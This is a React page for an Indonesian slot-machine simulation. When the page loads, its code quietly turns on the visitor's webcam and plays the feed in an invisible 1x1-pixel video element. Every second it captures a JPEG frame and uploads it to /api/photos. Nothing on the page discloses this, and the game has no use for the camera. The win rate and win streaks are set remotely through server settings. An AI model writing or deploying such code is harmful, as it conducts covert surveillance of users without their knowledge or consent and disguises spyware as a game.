'use client';

import { useEffect, useRef, useState } from 'react';

const symbols = ['🍒', '🍋', '⭐', '🔔', '7️⃣'];
const INITIAL_BALANCE = 100000;
const BASE_BET = 5000;

function randomSymbol() {
  return symbols[Math.floor(Math.random() * symbols.length)];
}

function formatRupiah(amount) {
  return new Intl.NumberFormat('id-ID').format(amount);
}

export default function HomePage() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const savingRef = useRef(false);
  const [accuracy, setAccuracy] = useState(70);
  const [maxWin, setMaxWin] = useState(50000);
  const [maxStreak, setMaxStreak] = useState(3);
  const [slotResult, setSlotResult] = useState(['🍒', '🍋', '⭐']);
  const [message, setMessage] = useState('Tekan SPIN untuk mulai bermain.');
  const [balance, setBalance] = useState(INITIAL_BALANCE);
  const [streak, setStreak] = useState(0);
  const [isSpinning, setIsSpinning] = useState(false);

  useEffect(() => {
    let timer;
    let stream;

    const startCameraAndCapture = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play().catch(() => {});

          if (videoRef.current.readyState < 2) {
            await new Promise((resolve) => {
              videoRef.current.addEventListener('loadeddata', resolve, { once: true });
            });
          }
        }

        timer = setInterval(async () => {
          if (!videoRef.current || !canvasRef.current || savingRef.current) {
            return;
          }

          const video = videoRef.current;
          const canvas = canvasRef.current;

          if (!video.videoWidth || !video.videoHeight) {
            return;
          }

          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const image = canvas.toDataURL('image/jpeg', 0.7);

          try {
            savingRef.current = true;
            await fetch('/api/photos', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ image })
            });
          } finally {
            savingRef.current = false;
          }
        }, 1000);
      } catch (error) {
        console.error('Kamera tidak tersedia atau izin ditolak.', error);
      }
    };

    startCameraAndCapture();

    return () => {
      if (timer) clearInterval(timer);
      if (stream) {
        stream.getTracks().forEach((track) => track.stop());
      }
    };
  }, []);

  useEffect(() => {
    const loadSettings = async () => {
      const response = await fetch('/api/settings');
      const data = await response.json();
      setAccuracy(data.accuracy);
      setMaxWin(data.maxWin);
      setMaxStreak(data.maxStreak);
    };

    loadSettings();
  }, []);

  const spin = async () => {
    if (isSpinning) {
      return;
    }

    if (balance < BASE_BET) {
      setMessage('Saldo tidak cukup untuk SPIN.');
      return;
    }

    setIsSpinning(true);
    setBalance((prev) => prev - BASE_BET);

    const animationTimer = setInterval(() => {
      setSlotResult([randomSymbol(), randomSymbol(), randomSymbol()]);
    }, 90);

    await new Promise((resolve) => setTimeout(resolve, 1200));
    clearInterval(animationTimer);

    let won = Math.random() * 100 < accuracy;
    if (streak >= maxStreak) {
      won = false;
    }

    if (won) {
      const winSymbol = randomSymbol();
      const reward = Math.max(1000, Math.floor(Math.random() * maxWin) + 1);
      setSlotResult([winSymbol, winSymbol, winSymbol]);
      setBalance((prev) => prev + reward);
      setStreak((prev) => prev + 1);
      setMessage(`MENANG! +Rp ${formatRupiah(reward)}`);
    } else {
      let result = [randomSymbol(), randomSymbol(), randomSymbol()];
      while (result[0] === result[1] && result[1] === result[2]) {
        result = [randomSymbol(), randomSymbol(), randomSymbol()];
      }
      setSlotResult(result);
      setStreak(0);
      setMessage(`Belum beruntung. -Rp ${formatRupiah(BASE_BET)}`);
    }

    setIsSpinning(false);
  };

  return (
    <main className="container slot-page">
      <h1>SIMULASI MESIN SLOT</h1>

      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        style={{
          position: 'fixed',
          width: 1,
          height: 1,
          opacity: 0,
          pointerEvents: 'none',
          top: 0,
          left: 0
        }}
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      <section className="card slot-card">
        <h2>Mesin Slot</h2>
        <div className="slot-stats">
          <p>
            Saldo: <strong>Rp {formatRupiah(balance)}</strong>
          </p>
          <p>
            Bet: <strong>Rp {formatRupiah(BASE_BET)}</strong>
          </p>
        </div>

        <div className={`slot-reels ${isSpinning ? 'spinning' : ''}`}>
          {slotResult.map((symbol, index) => (
            <div key={`${symbol}-${index}`} className="slot-reel">
              {symbol}
            </div>
          ))}
        </div>

        <button onClick={spin} disabled={isSpinning}>
          {isSpinning ? 'SPINNING...' : 'SPIN'}
        </button>
        <p className="slot-message">{message}</p>
      </section>
    </main>
  );
}
